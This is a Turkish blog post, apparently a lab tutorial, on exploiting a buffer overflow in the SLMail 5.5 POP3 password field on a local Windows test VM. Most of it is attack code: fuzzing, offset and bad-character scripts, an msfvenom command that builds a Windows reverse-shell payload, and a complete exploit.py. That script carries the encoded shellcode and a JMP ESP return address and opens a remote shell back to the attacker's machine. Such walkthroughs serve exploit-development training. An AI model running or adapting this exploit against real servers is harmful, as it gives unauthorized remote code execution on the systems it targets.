---
layout: post
title: Buffer Overflow Uygulama Örneği - SLMail
categories: tr
---

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Uzun bir aradan sonra bu not defterimi tekrar kullanmaya karar verdim. Bu yazıda, buffer overflow zafiyeti bulunan örnek bir uygulama üzerinde çalışma yapacağız. SLMail uygulamasına <a href="https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe">bu</a> linkten ulaşabilirsiniz. Uygulamayı 32 bit Windows VM üzerinde ayaklandırdıktan sonra aynı makineye <a href="https://debugger.immunityinc.com/">şu</a> linkten eriştiğimiz Immunity Debugger aracını da kurmamız gerekiyor. 

<center><img src="/img/buffer-overflow-slmail/slmail-conf.png"></center>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SLMail konfigürasyon uygulamasını admin yetkileriyle çalıştırarak işe başlıyoruz.Aynı şekilde admin yetkileriyle çalıştırdığımız Immunity Debugger aracına SLmail Process'ini ekliyoruz ve `Run` diyoruz. 

<img src="/img/buffer-overflow-slmail/id-1.png">

<img src="/img/buffer-overflow-slmail/id-2.png" height="522" width="881">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SLMail yüklü olan Windows sunucu üzerinde keşif çalışmalarımıza başlayalım. 

	nmap -sV -T4 192.168.0.19 

<img src="/img/buffer-overflow-slmail/nmap.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ekran görüntüsünden SLMail servisinin çalışmaya başladığını görüyoruz. Bu mail servisini bağlantı kurmaya çalışırken kullanıcı adı ve parola ikilisini input olarak gönderiyoruz. Uygulama süresince parola parametresini taşırmaya çalışıp zafiyeti kullanarak kod çalıştırmaya çalışacağız. Bunun için öncelikle buffer'ın nerede taştığını tespit etmemiz gerekiyor. El yordamıyla nerede taştığını tespit etmemiz zaman alacağı için aşağıdaki gibi basit bir kod yardımıyla fuzzing işlemi gerçekleştireceğiz. Bu sayede buffer için ne büyüklükte bir yer ayrıldığını ve nerede taştığını anlamaya çalışacağız.

	#fuzzer.py
	#!/usr/bin/python
	import time, struct, sys
	import socket as so

	junk=["A"]
	max_buffer = 4000
	counter = 100
	increment = 200

	while len(junk) <= max_buffer:
	    junk.append("A"*counter)
	    counter=counter+increment

	for string in junk:
	     try:
		server = "192.168.0.19"
		port = 110
	     except IndexError:
		sys.exit()
	     print "[+] Sending data %s bytes" % len(string)
	     s = so.socket(so.AF_INET, so.SOCK_STREAM)
	     try:
		s.connect((server,port))
		s.recv(1024)
		s.send('USER user\r\n')
		s.recv(1023)
		s.send('PASS ' + string + '\r\n')
		s.send('QUIT\r\n')
		s.close()
	     except:
		print "[+] Connection failed."
	sys.exit()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Debugger üzerine geldiğimizde aşağıdaki gibi buffer'ın taştığını ve EIP üzerine gelen `A` karakterlerini görüyoruz.

<img src="/img/buffer-overflow-slmail/fuzzer-result.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kodu çalıştırdığımızda uygulamamızın 2700 byte'lık input gönderme sırasında yerlerde çakıldığını göreceğiz. Bu işlem sayesinde buffer boyutu hakkında bilgi sahibi olduk. Bir sonraki aşamada EIP register'ı üzerine istediğimiz değeri getirmemiz için ne boyutta bir taşırma yapmamız gerektiğini anlamaya çalışacağız. Çünkü EIP register'ı, bir sonraki çalışacak olan komutun adres değerini tutacak. Bu sayede istediğimiz değeri buraya düşürebilirsek, taşırma işlemi ile kodumuzu yürütebileceğiz. Metasploit üzerinde yer alan pattern_create uygulaması ile istediğimiz boyutta bir pattern üretip hedefe yollayacağız. EIP üzerine denk gelen offset değerini alıp pattern_offset uygulamasında karşılık geldiği sırayı tespit edeceğiz. Bu sayede kaç boyutluk veriden sonra EIP üzerine değerimizin düştüğünü anlayacağız.

	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700

<img src="/img/buffer-overflow-slmail/pattern-create.png">

	#pattern.py
	#!/usr/bin/python
	import time, struct, sys
	import socket as so

	pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"

	try:
	   server = "192.168.0.19"
	   port = 110
	except IndexError:
	   sys.exit()
	s = so.socket(so.AF_INET, so.SOCK_STREAM)
	try:
	   s.connect((server,port))
	   s.recv(1024)
	   s.send('USER user' +'\r\n')
	   s.recv(1024)
	   s.send('PASS ' + pattern + '\r\n')
	   print "\n[+] Completed."
	except:
	   print "[+] Connection Failed."
	sys.exit()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EIP üzerine gelen `39694438` değeri bize kaç byte'lık veriden sonra buraya ulaşıldığını gösterecek.

<img src="/img/buffer-overflow-slmail/pattern-create-result.png">



	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438

<img src="/img/buffer-overflow-slmail/pattern-offset.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2606 byte'lık veriden sonra EIP register'ına ulaşıyoruz. Kontrol amaçlı kodumuzu düzenleyerek EIP üzerine 'B' değerini bastıralım. Aşağıda görüldüğü gibi 2606 doğru bir değer olarak karşımıza çıkıyor. 

	#verify.py
	#!/usr/bin/python
	import time, struct, sys
	import socket as so

	junk = "A" * 2606 + "B" * 4 + "C" * 90

	try:
	   server = "192.168.0.19"
	   port = 110
	except IndexError:
	   sys.exit()
	s = so.socket(so.AF_INET, so.SOCK_STREAM)
	try:
	   s.connect((server,port))
	   s.recv(1024)
	   s.send('USER user' +'\r\n')
	   s.recv(1024)
	   s.send('PASS ' + junk + '\r\n')
	   print "\n[+] Completed."
	except:
	   print "[+] Connection Failed."
	sys.exit()

<img src="/img/buffer-overflow-slmail/pattern-offset-proof.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu aşamadan sonra en sıkıcı işlem başlıyor. Kodumuzun yürütülmesine engel olacak olan `badchar`'ları tespit edeceğiz. Shell kodumuzu, bu karakterleri içermeden üretmeyi sağlayacağız. Bunun için aşağıdaki gibi sıralı listeden tüm karakterleri göndererek başlıyoruz. Listede yer almayan `'\x00'` yani NULL, dizeleri sonlandırdığı için doğrudan badchar olarak kabul edilir.

	#badchar1.py
	#!/usr/bin/python
	import time, struct, sys
	import socket as so

	badchars=(
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

	junk = "A" * 2606 + "B" * 4 + badchars

	try:
	   server = "192.168.0.19"
	   port = 110
	except IndexError:
	   sys.exit()
	s = so.socket(so.AF_INET, so.SOCK_STREAM)
	try: 
	   s.connect((server,port))
	   s.recv(1024)
	   s.send('USER user' +'\r\n')
	   s.recv(1024)
	   s.send('PASS ' + junk + '\r\n')
	   print "\n[+] Completed."
	except:
	   print "[+] Connection Failed."
	sys.exit()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Karakterleri gönderdikten sonra Immunity Debugger üzerinde gelmesi gereken sıraya gelmemiş ve sırayı bozmuş olan karakterleri bulup badchar olarak işaretleyeceğiz. İlk incelemede x09'dan sonra x0a gelmesi gerekirken, gelmediği için bu karakterin sırayı bozduğunu anlıyoruz ve `x0a`'i badchar olarak tespit ediyoruz. 

<img src="/img/buffer-overflow-slmail/badchar-1.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`x0a` olmadan kodu tekrar yollayalım.

	#badchar2.py
	#!/usr/bin/python
	import time, struct, sys
	import socket as so

	badchars=(
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

	junk = "A" * 2606 + "B" * 4 + badchars

	try:
	   server = "192.168.0.19"
	   port = 110
	except IndexError:
	   sys.exit()
	s = so.socket(so.AF_INET, so.SOCK_STREAM)
	try: 
	   s.connect((server,port))
	   s.recv(1024)
	   s.send('USER user' +'\r\n')
	   s.recv(1024)
	   s.send('PASS ' + junk + '\r\n')
	   print "\n[+] Completed."
	except:
	   print "[+] Connection Failed."
	sys.exit()
 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Devam ederken tespit ettiğimiz bu karakteri listeden çıkarıp diğer karakterleri tekrar yolluyoruz. Ve ikinci badchar sırayı bozduğu için `x0d`...

<img src="/img/buffer-overflow-slmail/badchar-2.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`x0a` ve `x0d` olmadan kodu tekrar yollayalım.

	#badchar3.py
	#!/usr/bin/python
	import time, struct, sys
	import socket as so

	badchars=(
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

	junk = "A" * 2606 + "B" * 4 + badchars

	try:
	   server = "192.168.0.19"
	   port = 110
	except IndexError:
	   sys.exit()
	s = so.socket(so.AF_INET, so.SOCK_STREAM)
	try: 
	   s.connect((server,port))
	   s.recv(1024)
	   s.send('USER user' +'\r\n')
	   s.recv(1024)
	   s.send('PASS ' + junk + '\r\n')
	   print "\n[+] Completed."
	except:
	   print "[+] Connection Failed."
	sys.exit()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;İncelemeye devam ettikten sonra görüyoruz ki sıralama iyi gidiyor ve toplamda sadece iki tane badchar mevcut. Listeye koymadığımız ve en başından beri badchar kabul ettiğimiz `x00` ile birlikte 3 tane badchar belirledik.

	x00,x0a,x0d

<img src="/img/buffer-overflow-slmail/nobadchar.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Badchar belirleme işlem bittikten sonra msfvenom ile üretim yaparken bu karakterleri belirterek işleme devam ediyoruz. 

	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.11 LPORT=443 -f py -b '\x00\x0a\x0d\' -a x86 --platform windows -e x86/shikata_ga_nai

<img src="/img/buffer-overflow-slmail/msfvenom.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu aşamaya kadar buffer'ın nerede taştığını ve badchar bulma işlemlerini gerçekleştirdik. Çalıştıracak olduğumuz uygulamayı da oluşturduk. Sıra son olarak EIP üzerine yazacağımız değeri bulmaya geldi. Buffer taştıktan sonra EIP register'ı bizi çalıştıracak olduğumuz uygulamaya götürecek. İşimizi kolaylaştırmak için Immunity Debugger'a Mona eklentisini ekleyeceğiz. <a href="https://github.com/corelan/mona/blob/master/mona.py">Şuradan</a> edinebilirsiniz. Buradaki kodu, Immunity Debugger'ın kurulu olduğu dizindeki `PyCommands` klasörünün içine yapıştırıyoruz.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Öncelikle '!mona modules' yazarak uygulamanın çağırdığı DLL'i tespit ediyoruz.

	!mona modules

<img src="/img/buffer-overflow-slmail/slmfc-dll.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sonrasında '!mona find -s "\xff\xe4" -m slmfc.dll' ile hedef adresimizi buluyoruz.

	!mona find -s "\xff\xe4" -m slmfc.dll

<img src="/img/buffer-overflow-slmail/esp.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bulduğumuz adres ile exploit kodumuzu tekrar düzenleyerek hedefe yönlendiriyoruz. 

	#exploit.py
	#!/usr/bin/python
	# coding=utf-8

	import time, struct, sys
	import socket as so

	buf =  ""
	buf += "\xdd\xc1\xbf\xfe\x75\x33\xbb\xd9\x74\x24\xf4\x58\x29"
	buf += "\xc9\xb1\x52\x31\x78\x17\x83\xe8\xfc\x03\x86\x66\xd1"
	buf += "\x4e\x8a\x61\x97\xb1\x72\x72\xf8\x38\x97\x43\x38\x5e"
	buf += "\xdc\xf4\x88\x14\xb0\xf8\x63\x78\x20\x8a\x06\x55\x47"
	buf += "\x3b\xac\x83\x66\xbc\x9d\xf0\xe9\x3e\xdc\x24\xc9\x7f"
	buf += "\x2f\x39\x08\x47\x52\xb0\x58\x10\x18\x67\x4c\x15\x54"
	buf += "\xb4\xe7\x65\x78\xbc\x14\x3d\x7b\xed\x8b\x35\x22\x2d"
	buf += "\x2a\x99\x5e\x64\x34\xfe\x5b\x3e\xcf\x34\x17\xc1\x19"
	buf += "\x05\xd8\x6e\x64\xa9\x2b\x6e\xa1\x0e\xd4\x05\xdb\x6c"
	buf += "\x69\x1e\x18\x0e\xb5\xab\xba\xa8\x3e\x0b\x66\x48\x92"
	buf += "\xca\xed\x46\x5f\x98\xa9\x4a\x5e\x4d\xc2\x77\xeb\x70"
	buf += "\x04\xfe\xaf\x56\x80\x5a\x6b\xf6\x91\x06\xda\x07\xc1"
	buf += "\xe8\x83\xad\x8a\x05\xd7\xdf\xd1\x41\x14\xd2\xe9\x91"
	buf += "\x32\x65\x9a\xa3\x9d\xdd\x34\x88\x56\xf8\xc3\xef\x4c"
	buf += "\xbc\x5b\x0e\x6f\xbd\x72\xd5\x3b\xed\xec\xfc\x43\x66"
	buf += "\xec\x01\x96\x29\xbc\xad\x49\x8a\x6c\x0e\x3a\x62\x66"
	buf += "\x81\x65\x92\x89\x4b\x0e\x39\x70\x1c\xf1\x16\x7a\xd7"
	buf += "\x99\x64\x7a\xe6\xe2\xe0\x9c\x82\x04\xa5\x37\x3b\xbc"
	buf += "\xec\xc3\xda\x41\x3b\xae\xdd\xca\xc8\x4f\x93\x3a\xa4"
	buf += "\x43\x44\xcb\xf3\x39\xc3\xd4\x29\x55\x8f\x47\xb6\xa5"
	buf += "\xc6\x7b\x61\xf2\x8f\x4a\x78\x96\x3d\xf4\xd2\x84\xbf"
	buf += "\x60\x1c\x0c\x64\x51\xa3\x8d\xe9\xed\x87\x9d\x37\xed"
	buf += "\x83\xc9\xe7\xb8\x5d\xa7\x41\x13\x2c\x11\x18\xc8\xe6"
	buf += "\xf5\xdd\x22\x39\x83\xe1\x6e\xcf\x6b\x53\xc7\x96\x94"
	buf += "\x5c\x8f\x1e\xed\x80\x2f\xe0\x24\x01\x5f\xab\x64\x20"
	buf += "\xc8\x72\xfd\x70\x95\x84\x28\xb6\xa0\x06\xd8\x47\x57"
	buf += "\x16\xa9\x42\x13\x90\x42\x3f\x0c\x75\x64\xec\x2d\x5c"

	data = 2606 * "A" + "\x8f\x35\x4a\x5f" + 16 * "\x90" + buf

	try:
	   server = "192.168.0.19"
	   port = 110
	except IndexError:
	   sys.exit()
	s = so.socket(so.AF_INET, so.SOCK_STREAM)
	try:
	   s.connect((server,port))
	   s.recv(1024)
	   s.send('USER user' +'\r\n')
	   s.recv(1024)
	   s.send('PASS ' + data + '\r\n')
	except:
	   print "Connection Failed"
	   sys.exit()


<img src="/img/buffer-overflow-slmail/exploit.png">























